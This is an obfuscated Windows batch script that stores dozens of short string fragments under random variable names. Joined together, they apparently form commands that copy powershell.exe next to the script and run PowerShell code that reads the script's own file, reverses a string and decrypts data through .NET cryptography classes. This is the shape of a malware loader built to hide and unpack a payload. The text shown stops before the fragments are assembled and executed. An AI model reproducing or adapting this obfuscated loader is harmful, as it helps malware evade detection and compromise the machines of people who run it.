@echo off
set "VBdlVnrqub=Sy"
set "HstZuzMmwx=co"
set "IitxFOoraO=ll"
set "LGBaMxBgfH=we"
set "xkiAUViNFj=he"
set "ntIMrgthKF=po"
set "aKlxjKhxcl=y "
set "XKKqoGBRiV=ow"
set "GRluwKBcCf= C"
set "tLZjPAkgqi=ll"
set "ZCIkjCKJAy=rS"
set "vQrNlIzLng=ws"
set "fVraNboMNA=st"
set "zZNRljSFEb=he"
set "pRBtiCVlBR=xe"
set "hMdLyJRkDf=.e"
set "IVRYAkEsIH= /"
set "tcwMhZKaXu=in"
set "hsFFgGvNUi=\v"
set "jiEhRmUUKL=:\"
set "nQJqaiiOmr=do"
set "oRzWpMSKPC=1."
set "kVQnMPgZDJ=nd"
set "okxgQirVCE=\W"
set "NeLwNQJwhT=we"
set "TWRdoBZAHe=em"
set "VECyilQCFq=rs"
set "dJVpFHOjna=s\"
set "LYdbhvOZZr=Wi"
set "jeYdLZAavO=Po"
set "FVCdZQjlEu=0\"
set "OfZZiXDFbr=py"
set "bXMCNvGyua=32"
set "QpKQzDZnlf=cd"
set "igTdzThmHs= %~dp0"
set "Ihscerlpve=('%~f0'"
set "EbBszkuTbj=ddin"
set "JALDRlDETW=ke($"
set "HvUZQUctlz=ateD"
set "ePlXUhfVSr='[-1"
set "oEGRJhEeHT=rans"
set "gVprWqHpsZ=-joi"
set "HJuhlWHnxJ=mxKl"
set "otFtWpkhxq=DNJS"
set "auPeZOJADv=comm"
set "vJOjbAKtNa=jST."
set "qQkFxOaHaq=, $m"
set "IONJIgUaiV=Secu"
set "WKjzuqnYTW=[]] "
set "YqxsSszCFP= [Sy"
set "bgwEbeKjXf=.Com"
set "kJOYxBQzbs=.IO."
set "GCWVzBSwKh=rKqX"
set "NOaJGNCwiu=6] -"
set "ScGNpnKXql=yste"
set "KJloByKstT=z = "
set "xJHwvvSNZv=e]::"
set "vtJerEgcJi=rKqX"
set "gsCITpCyVq='txe"
set "IcQAxSuXfv=.Cop"
set "WXJozaxPFJ=);$E"
set "HdFluVmWqf=$ylz"
set "ucrSVEFFGh=lP ="
set "aEJzghRljB=rKqX"
set "LtkFlYefUJ=ST.T"
set "spxsKXxwHZ=ing("
set "sMmVgMyEyh=X.Pa"
set "xTJIqlztZW=e = "
set "vtnrjulLWp=BNZh"
set "ceKxyknWqc=ylzz"
set "lJuTlDPfhV=th('"
set "YTUgSiXGtb=.Sec"
set "bnLtXqLNXB=urit"
set "ubiOWmkfWP=$mxK"
set "TDiwxqYFzq=Wfpi"
set "sIelBKeTik=jST "
set "XeDLjJQcae=tion"
set "QaafXMOXlV=Fina"
set "kJnHtENhbv=tsWi"
set "QFoSMdvvtY=$SrK"
set "kQbgxldYCc=rofi"
set "jhSDCFvrDf=pose"
set "HiyLNKxdsg=ek);"
set "qpoRCpihnt=se()"
set "CuOBxWtJfd=BC;$"
set "oWADpHZkXR=;$yA"
set "fZBCmujFcS=O.Me"
set "msydBJsdvF=M.Su"
set "xzBulqWKVe=gth)"
set "nqAndNXfGi=ek ="
set "EGYTlXNNBS='[-1"
